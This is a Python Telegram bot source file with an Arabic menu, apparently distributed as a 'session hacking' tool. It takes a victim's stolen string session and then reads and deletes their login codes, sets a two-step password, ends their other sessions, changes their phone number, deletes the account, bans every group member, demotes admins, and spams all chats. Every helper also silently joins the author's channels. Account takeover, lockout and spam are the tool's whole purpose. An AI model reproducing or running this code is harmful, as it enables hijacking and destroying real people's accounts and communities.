
# COPYRIGHT © 2022 BY ANES @B_8_1 🔥

import os
os.system("pip install -U telethon")
from telethon import TelegramClient, events, functions, types, Button
from datetime import timedelta
import asyncio

api_id = os.environ.get("APP_ID")
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('IndianHack', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

IndianHack = 5046520072

Bot_Username =os.environ.get("BOT_USERNAME", None) or "SessionHackingBot"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await bot(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await bot(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await bot(leave("@Ids_Holder"))
    except BaseException:
      pass
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await bot(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await bot(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await bot(leave("@Ids_Holder"))
    except BaseException:
      pass
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_me()
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@SESSIONSUPPORT"))
    except BaseException:
      pass
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X.edit_2fa('IndianHack IS BEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    i = ""
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "S8Y8S"
menu = '''

"A" :~  تحقق من المجموعات والقنوات الخاصة بالمستخدم


"B" :~  تحقق من جميع معلومات المستخدم مثل رقم الهاتف واسم المستخدم ... إلخ


"C" :~ حظر اعضاء المجموعه /  قناه {اعطني كود ترمكس و من ثم اسم المستخدم للمجموعه / للقناه} و ساحضر جميع اعضاء هناك


"D" :~ [معرفه اخر كود تسجيل دخول {اولا خذ رقم الهاتف و سجل دخول اليه و استخدمني لاعطيك كود تسجيل الدخول}]


"E" :~ [انضم إلى مجموعة / قناة عبر كود ترمكس]


"F" :~ [مغارده مجموعة / قناة عبر كود ترمكس]


"G" :~ [حذف مجموعة / قناة]


"H" :~ [تحقق من المستخدم بخطوتين ممكّنة أو معطّلة]


"I" :~ [قم بإنهاء جميع الجلسات النشطة الحالية باستثناء جلسة كود ترمكس الخاصة بالحساب]


"J" :~ [حذف الحساب]


"L" :~ [ازاله جميع المسؤولين في مجموعة / قناة]


"K" ~ [رفع عضو {مشرف} في مجموعة / قناة]


"M" ~ [تغيير رقم الهاتف باستخدام كود ترمكس]

"N" ~ [اوامر الاذاعه]

ملاحظة : الاوامر للحساب والقنوات والكروبات ✅

قناة البوت 🚹 @S8Y8S 
'''
mm = '''
**⚜ملاحضه الانضمام الأولا الى الدعم @SESSIONSUPPORT⚜**
'''

keyboard = [
  [  
    Button.inline("A", data="A"), 
    Button.inline("B", data="B"),
    Button.inline("C", data="C"),
    Button.inline("D", data="D"),
    Button.inline("E", data="E")
    ],
  [
    Button.inline("F", data="F"), 
    Button.inline("G", data="G"),
    Button.inline("H", data="H"),
    Button.inline("I", data="I"),
    Button.inline("J", data="J"),
    ],
  [
    Button.inline("K", data="K"), 
    Button.inline("L", data="L"),
    Button.inline("M", data="M"),
    Button.inline("N", data="N"),
    ],
  [
    Button.url("Owner", "https://t.me/B_8_1")
    ]
]

@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    IndianHack = [
      [
        Button.url("انقر هنا", f"https://t.me/{Bot_Username}?start=zi")
        ]
      ]         
    await event.reply("انقر أدناه لاستخدامني", buttons=IndianHack)
 # else:
  #  legendbye = [
  #    [
   #     Button.url("يجب أن تنضم", f"https://t.me/S8Y8S")
    #    ]
    #  ]
   # await event.reply("انضم أولاً إلى القناة! \n ثم حاول انقر هنا ~ /hack", buttons=legendbye)
    
       
@client.on(events.NewMessage(pattern="/zi", func=lambda x: x.is_group))
async def op(event):
  IndianHack = [
    [
      Button.url("انقر هنا", f"https://t.me/{Bot_Username}")
      ]
    ]         
  await event.reply("انقر أدناه لاستخدامي", buttons=IndianHack)
  
@client.on(events.NewMessage(pattern="/zi", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    keyboard = [
      [  
        Button.inline("A", data="A"), 
        Button.inline("B", data="B"),
        Button.inline("C", data="C"),
        Button.inline("D", data="D"),
        Button.inline("E", data="E")
        ],
      [
        Button.inline("F", data="F"), 
        Button.inline("G", data="G"),
        Button.inline("H", data="H"),
        Button.inline("I", data="I"),
        Button.inline("J", data="J")
        ],
      [
        Button.inline("K", data="K"), 
        Button.inline("L", data="L"),
        Button.inline("M", data="M"),
        Button.inline("N", data="N"),
        ],
      [
        Button.url("Owner", "https://t.me/B_8_1")
        ]
    ]
    await x.send_message(f"اختر ما تريد مع جلسة ترمكس \n\n{menu}", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا.\n /zi", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("تم إنهاء جلسة كود ترمكس مسبقا.\n/zi", buttons=keyboard)
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDetails BY @S8Y8S")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nشكرا لاستخدام البوت \n/zi", buttons=keyboard)
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل كود ترمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا.\n/zi", buttons=keyboard)
    i = await userinfo(strses.text)
    await event.reply(i + "\n\nشكرا لاستخدام البوت \n/hack", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل كود ترمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
    await x.send_message("اعطني يوزر / ايدي .... المجموعة / القناة")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("تم حضر جميع الاعضاء. شكرا لاستخدام البوت \n/zi", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nشكرا لاستخدام البوت \n/zi", buttons=keyboard)
    
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل كود ترمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
    await x.send_message("اعطني  يوزر / ايدي .... المجموعة / القناة")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("انضم إلى القناة / المجموعة شكرا لاستخدام البوت \n/zi", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل كود ترمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
    await x.send_message("اعطني يوزر  / ايدي .... المجموعة / القناة")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("غادرت القناة / المجموعة شكرا لاستخدام البوت \n/zi,", buttons=keyboard)
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
      await x.send_message("اعطني يوزر / ايدي .... المجموعة / القناة")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("تم حذف القناة / المجموعة شكرا لاستخدام البوت \n/zi.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم انهاء الجلسه مسبقا.", buttons=keyboard)
      i = await user2fa(strses.text)
      if i:
        await event.reply("الحساب لا يمتلك تحقق بخطوتين يمكنك الان تسجيل الدخول باستخدام امر <D>\n\nشكرا لاستخدامك البوت.", buttons=keyboard)
      else:
        await event.reply("عذرا المستخدم لديه خطوتين بالفعل", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
      i = await terminate(strses.text)
      await event.reply("يتم إنهاء جميع الجلسات\n\nشكرا لاستخدام البوت \n/zi.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n /zi", buttons=keyboard)
      i = await delacc(strses.text)
      await event.reply("تم حذف الحساب بنجاح\n\nشكرا لاستخدام البوت \n /zi.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
      await x.send_message("الان ارسل لي يوزر  المجموعة / القناة")
      grp = await x.get_response()
      await x.send_message("الان ارسل اليوزر  خاص بك")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("أنا أقوم برفعك في المجموعة / القناة ، انتظر دقيقة 😗😗\n\nشكرا لاستخدام البوت \n/zi .", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
      await x.send_message("أعطِ الآن يوزر المجموعة / القناة")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("اقوم بتنزيل جميع أعضاء المجموعة / القناة ، انتظر دقيقة 😗😗\n\nشكرا لاستخدام البوت \n/zi .", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
      await x.send_message("أعط الرقم الذي تريد تغييره \ n [ملاحظة: لا تستخدم الارقام الوهميه أو اكتب الآن أرقامًا] \ n [إذا كنت تستخدم تطبيق ارقام وهميه أو النص الآن ، فلا يمكنك الحصول على كود تسجيل الدخول] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n انسخ تجزئة رمز الهاتف وتحقق من رقمك الذي حصلت عليه \ n أتوقف لمدة 20 ثانية انسخ تجزئة رمز الهاتف و كود تسجيل الدخول")
        await asyncio.sleep(20)
        await x.send_message("أعط الآن تجزئة رمز الهاتف")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("الان ارسل كود")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("تم تغيير رقم التهاني")
        else:
          await event.respond("هناك شئ غير صحيح")
      except Exception as e:
        await event.respond("أرسل هذا الخطأ إلى - @SESSIONSUPPORT\n**LOGS**\n" + str(e))



@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
async def start(event):
    keyboard = [
      [  
        Button.inline("a", data="a"), 
        Button.inline("b", data="b"),
        Button.inline("c", data="c"),
        ],
      [
        Button.url("Owner", "https://t.me/B_8_1")
        ]
    ]
    await event.reply("الان اختار نوع الاذاعه \n✓ للقنوات و كروبات و الخاص - اختر <a>\n✓ للكروبات - اختر <b>\n✓ للخاص - اختر <c>", buttons=keyboard)



async def gcasta(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for aman in X.iter_dialogs():
                chat = aman.id
                try:
                    await X.send_message(chat, tol, file=file)     
                    if lol != -1001551357238:
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                    elif chat == -1001606996743:
                        pass
                    await asyncio.sleep()
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)        


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
      await x.send_message("NOW GIVE MSG")
      msg = await x.get_response()
      await x.send_message("تم الآن وسيتم إرسال الرسالة تلقائيًا كل 10 دقائق")
      i = await gcasta(strses.text, msg.text)
      await event.reply(f"الان يتم الاذاعه في {i} قنوات و كروبات و خاص 😗😗\n\nشكرا لاستخدام البوت \n/zi .", buttons=keyboard)

molb = True

async def gcastb(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for sweetie in X.iter_dialogs():
                if sweetie.is_group:
                    chat = sweetie.id
                    try:
                        if chat != -1001606996743:
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            while molb != False:
                                await asyncio.sleep(600)
                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
                        elif chat == -1001606996743:
                            pass
                    except Exception as e:
                        print(e)
        except Exception as e:
            print(e)


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
      await x.send_message("الان اعطني الرساله")
      msg = await x.get_response()
      await x.send_message("تم الآن وسيتم إرسال الرسالة تلقائيًا كل 10 دقائق")
      i = await gcastb(strses.text, msg.text)
      await event.reply(f"الان يتم الاذاعه في {i} كروبات 😗😗\n\nشكرا لاستخدام البوت \n/zi .", buttons=keyboard)

async def gcastc(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for krishna in X.iter_dialogs():
                if krishna.is_user and not krishna.entity.bot:
                    chat = krishna.id
                    try:
                        await X.send_message(chat, tol, file=file)
                        while molc != False:
                            await asyncio.sleep(10)
                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
                    except BaseException:
                        pass
        except Exception as e:
            print(e)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل كود ترمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n /zi", buttons=keyboard)
      await x.send_message("الان اعطني الرساله")
      msg = await x.get_response()
      await x.send_message("تم الآن وسيتم إرسال الرسالة تلقائيًا كل 10 دقائق")
      i = await gcastc(strses.text, msg.text)
      await event.reply(f"الان يتم الاذاعه في {i} الخاص😗😗\n\nشكرا لاستخدام البوت \n/hack .", buttons=keyboard)

print("⚜️ تم تنصيب البوت بنجاح ⚜️ يرجى الانضمام @SESSIONSUPPORT")
client.run_until_disconnected()
